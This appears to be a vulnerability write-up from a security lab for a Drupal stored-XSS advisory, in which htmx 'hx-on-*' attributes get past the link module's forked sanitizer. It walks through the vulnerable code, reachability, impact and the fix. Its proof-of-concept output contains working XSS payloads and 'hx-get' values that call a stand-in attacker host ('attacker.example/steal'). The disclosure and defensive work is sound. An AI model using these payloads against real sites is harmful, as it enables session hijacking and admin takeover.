# F2 — SA-CORE-2026-015 / CVE-2026-108515 — htmx event handlers survive the link sanitizer

**Component:** `core/modules/link`
**Fixed in:** Drupal 11.4.10 (2026-10-14)
**Upstream rating:** Moderately critical
**Class:** Stored XSS (and, with a privileged write, session takeover)

---

## 1. The vulnerable code

`core/modules/link/src/AttributeXss.php:25-50` — the attribute filter:

```php
private static function attributes(string $attributes): array {
  ...
  case 0:
    // Attribute name, href for instance.
    if (preg_match('/^([-a-zA-Z][-a-zA-Z0-9]*)/', $attributes, $match)) {
      $attribute_name = strtolower($match[1]);
      $skip = (
        $attribute_name == 'style' ||
        str_starts_with($attribute_name, 'on') ||
        str_starts_with($attribute_name, '-') ||          // <-- no 'hx' / 'data-hx'
        strlen($attribute_name) > 96
      );
```

The class is used in exactly two places in core:

```php
// core/modules/link/src/Plugin/Field/FieldFormatter/LinkFormatter.php:246
$options['attributes'] = AttributeXss::sanitizeAttributes($options['attributes']);

// core/modules/menu_link_content/src/Entity/MenuLinkContent.php:109
$url->setOption('attributes', AttributeXss::sanitizeAttributes($attributes));
```

`LinkFormatter` is the **default formatter** for the `link` field type, so
every rendered link field goes through it.

## 2. The fork that drifted

`AttributeXss` is a copy-paste fork of `Drupal\Component\Utility\Xss`. Its
own docblock admits it:

```php
// core/modules/link/src/AttributeXss.php:12-15
/**
 * @internal This class was added for a security fix and will be folded into
 *   the \Drupal\Component\Utility\Xss class in a public issue.
 */
```

The **upstream** class is already hardened against the htmx attribute
families:

```php
// core/lib/Drupal/Component/Utility/Xss.php:297-306
$skip = (
  in_array($attribute_name, ['style', 'srcdoc']) ||
  str_starts_with($attribute_name, 'on') ||
  str_starts_with($attribute_name, 'data-hx') ||      // <-- upstream has these
  str_starts_with($attribute_name, 'hx') ||           // <--
  str_starts_with($attribute_name, '-') ||
  strlen($attribute_name) > 96
);
```

The fork never received that change. It also lost upstream's `srcdoc` filter
(`Xss.php:298` uses `in_array($attribute_name, ['style','srcdoc'])`, the fork
tests only `style`) — inert for `<a>` elements, but a sign that the two copies
are no longer in sync.

## 3. Why `hx-*` is code execution, not cosmetics

**Drupal core 11.4 ships htmx 2.0.4**:

```yaml
# core/core.libraries.yml:845-853
htmx:
  remote: https://github.com/bigskysoftware/htmx
  version: "2.0.4"
  js:
    assets/vendor/htmx/htmx.min.js: { minified: true, preprocess: false }
```

htmx treats `hx-on-<event>` and `data-hx-on-<event>` as **inline JavaScript
event handlers**:

```js
// core/assets/vendor/htmx/htmx.js:2916-2936
function processHxOnWildcard(elt) {
  // wipe any previous on handlers so that this function takes precedence
  deInitOnHandlers(elt);

  for (let i = 0; i < elt.attributes.length; i++) {
    const name = elt.attributes[i].name
    const value = elt.attributes[i].value
    if (startsWith(name, 'hx-on') || startsWith(name, 'data-hx-on')) {
      const afterOnPosition = name.indexOf('-on') + 3
      const nextChar = name.slice(afterOnPosition, afterOnPosition + 1)
      if (nextChar === '-' || nextChar === ':') {
        let eventName = name.slice(afterOnPosition + 1)
        ...
        addHxOnEventHandler(elt, eventName, value)   // <-- value is executed
      }
    }
  }
}
```

and it walks the **whole document body** on load:

```js
// core/assets/vendor/htmx/htmx.js:5116-5121
ready(function() {
  ...
  let body = getDocument().body
  processNode(body)
```
```js
// core/assets/vendor/htmx/htmx.js:3023
forEach(findHxOnWildcardElements(elt), processHxOnWildcard)
```

### 3.1 When does the attribute actually execute?

Keep two things apart:

1. **The attribute is always emitted.** That is the bug: Drupal's attribute
   allow-list lets `hx-on-*` through, so the value reaches the HTML.
2. **It only becomes executed JavaScript when the htmx runtime is loaded on
   that page.**

Drupal 11.4 ships htmx 2.0.4 and has first-class htmx support:

* `Drupal\Core\Htmx\Htmx` — whose `applyTo()` attaches the
  `core/drupal.htmx` library to the element it is applied to
  (`core/lib/Drupal/Core/Htmx/Htmx.php:1291-1295`);
* the `drupal_htmx` wrapper format and the `HtmxRenderer`
  (`core/lib/Drupal/Core/Render/MainContent/HtmxRenderer.php`);
* the `core/drupal.htmx` library itself, which carries `tooltip.js`,
  `htmx-utils.js` and `htmx-behaviors.js`.

`big_pipe` — a hard dependency of the standard install profile — depends on
`core/htmx`:

```yaml
# core/profiles/standard/standard.info.yml:23
  - big_pipe
```
```yaml
# core/modules/big_pipe/big_pipe.libraries.yml:9-11
  dependencies:
    - core/htmx
    - core/drupal
    - core/drupal.htmx
```

**What is not true:** on a plain HTML page load, nothing in core attaches
`core/htmx` by itself, so the attribute is inert there. It becomes live on
pages served through Drupal's htmx wrapper format, and on any site that
attaches the htmx library — which is the case for sites that navigate with
htmx, the direction Drupal 11.4 takes.

The lab reproduces that situation on purpose:
`lab/modules/vulnlab_link/src/Hook/VulnLabLinkHooks.php` attaches
`core/drupal.htmx` to the lab content type, because otherwise the finding
would stop at "an unexpected attribute is present in the HTML".

Note the attribute names that matter — `hx-on-click`, `data-hx-on-click` —
contain **no colon**, so they survive Drupal's attribute-name grammar
(`/^([-a-zA-Z][-a-zA-Z0-9]*)/`). The colonated form `hx-on:click` is dropped
by the parser, but the dash form is not.

## 4. How the attribute gets there

The sanitiser runs on the link item's `options['attributes']` map. Core's Link
**widget** deliberately does not expose it:

```php
// core/modules/link/src/Plugin/Field/FieldWidget/LinkWidget.php:339-344
// Exposing the attributes array in the widget is left for alternate and
// more advanced field widgets.
$element['attributes'] = [
  '#type' => 'value',
  '#value' => !empty($items[$delta]->options['attributes']) ? $items[$delta]->options['attributes'] : [],
];
```

But the map **is** part of the REST/JSON:API representation — core's own REST
test suite asserts it round-trips:

```php
// core/modules/menu_link_content/tests/src/Functional/Rest/MenuLinkContentResourceTestBase.php:80-92
protected function getNormalizedPostEntity() {
  return [
    'link' => [[
      'uri' => 'http://www.urbandictionary.com/define.php?term=drama%20llama',
      'options' => [
        'fragment' => 'a-fragment',
        'attributes' => [
          'class' => ['example-class'],
        ],
      ],
    ]],
    ...
  ];
}
```

(`assertStoredEntityMatchesSentNormalization()` —
`core/modules/rest/tests/src/Functional/EntityResource/EntityResourceTestBase.php:935`.)

So the practical writers of `options.attributes` are:

1. **JSON:API** (a core module) with create/update access to an entity that
   carries a `link` field — a low-privilege content editor is enough.
2. **Contributed modules that expose link attributes** — a very common
   pattern, and the reason the advisory says the issue is *"not sufficiently
   sanitized in some circumstances"*.
3. Any custom code that puts user data into `options['attributes']`.

The lab ships both a JSON:API path and a widget
(`vulnlab_link_attributes`) that plays the role of the common contributed
module.

## 5. Proof of concept

### Standalone

```bash
DRUPAL_ROOT=/path/to/drupal-11.4.9 php lab/standalone/f2_attribute_xss.php
```

```
ATTRIBUTE NAME               KEPT?    SANITISED RESULT
--------------------------------------------------------------------
hx-on-click                  KEPT     {"hx-on-click":"alert(document.domain)"}
data-hx-on-click             KEPT     {"data-hx-on-click":"alert(document.domain)"}
hx-on-htmx-config-request    KEPT     {"hx-on-htmx-config-request":"alert(1)"}
hx-get                       KEPT     {"hx-get":"https:\/\/attacker.example\/steal"}
data-hx-get                  KEPT     {"data-hx-get":"https:\/\/attacker.example\/steal"}
onclick                      blocked  []
onerror                      blocked  []
style                        blocked  []
hx-on:click                  blocked  []

Upstream Drupal\Component\Utility\Xss::attributes('hx-on-click=...')
  => []
  (empty array = upstream blocks it; the Link module fork does not)
```

The `on*` and `style` families are correctly blocked — the hole is exactly
where the newly shipped htmx runtime reads from.

### End to end (with a real browser)

```bash
python3 lab/poc/f2_link_htmx_xss.py
```

```
  [+] logged in as the low-privilege editor 'labeditor'
  [+] planted the payload through the REST/JSON:API representation: /vulnlab-article/x
  [+] the htmx event handler survived Drupal's attribute sanitizer
        <a href="https://example.com/vulnlab" hx-on-click="window.__vulnlab_xss = true;">Click me</a>
  [+] the payload EXECUTED in a real browser (htmx registered the handler)
```

## 6. Impact

**Stored XSS** on every page that renders the link. Because htmx registers
the handler on load, the payload runs for every visitor who renders the page,
not only on click — `hx-on-load`-style events and `hx-on-htmx-config-request`
give an attacker several triggers to choose from.

In a Drupal context this means:

* **Session hijacking** — an administrator who views the page has their
  session cookie stolen.
* **Privilege escalation** — perform admin actions as the victim.
* **CSRF-token exfiltration**, defacement, drive-by redirects.

## 7. The fix

```diff
             $skip = (
               $attribute_name == 'style' ||
               str_starts_with($attribute_name, 'on') ||
+              str_starts_with($attribute_name, 'data-hx') ||
+              str_starts_with($attribute_name, 'hx') ||
               str_starts_with($attribute_name, '-') ||
```

Long term, retire the fork in favour of the shared
`Drupal\Component\Utility\Xss` implementation, as its docblock already
intends — a duplicated sanitizer will keep drifting.

## 8. Hardening advice for site builders

* Upgrade to 11.4.10.
* Until then, if a module exposes link attributes to editors, filter out
  `hx*` / `data-hx*` attribute names in your own code, or use a
  `hook_field_widget_form_alter()` that strips them before saving.
* If you do not use htmx at all, `big_pipe` can be disabled to remove the
  runtime that would execute the attributes — but the attributes would still
  be emitted, so treat this as defence in depth only.
